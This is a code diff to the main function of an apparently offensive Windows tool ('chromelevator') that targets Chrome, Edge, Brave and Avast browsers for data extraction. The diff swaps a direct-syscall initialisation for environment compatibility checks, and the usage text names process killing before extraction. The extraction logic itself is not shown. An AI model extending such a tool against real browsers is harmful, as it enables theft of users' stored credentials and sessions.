@@ -3,7 +3,7 @@
 
 #include "../core/common.hpp"
 #include "../core/console.hpp"
-#include "../sys/internal_api.hpp"
+#include "../core/diagnostics.hpp"
 #include "browser_discovery.hpp"
 #include "browser_terminator.hpp"
 #include "process_manager.hpp"
@@ -118,6 +118,16 @@ int wmain(int argc, wchar_t* argv[]) {
     Core::Console mainConsole(verbose);
     mainConsole.Banner();
 
+    auto envInfo = Core::Diagnostics::CollectEnvironmentInfo();
+    if (!envInfo.osCompatible) {
+        mainConsole.Error("Windows 10 1809 or later is required");
+        return 1;
+    }
+    if (!envInfo.systemLibsOk) {
+        mainConsole.Error("Required system libraries are not available");
+        return 1;
+    }
+
     if (targetType.empty()) {
         std::wcout << L"\n  Usage: chromelevator.exe [options] <chrome|chrome-beta|edge|brave|avast|all>\n\n";
         std::wcout << L"  Options:\n";
@@ -125,11 +135,6 @@ int wmain(int argc, wchar_t* argv[]) {
         std::wcout << L"    -f, --fingerprint  Extract browser fingerprint\n";
         std::wcout << L"    -k, --kill         Kill all browser processes before extraction\n";
         std::wcout << L"    -o, --output-path  Custom output directory\n";
-        return 1;
-    }
-
-    if (!Sys::InitApi(verbose)) {
-        mainConsole.Error("Syscall initialization failed");
         return 1;
     }
 
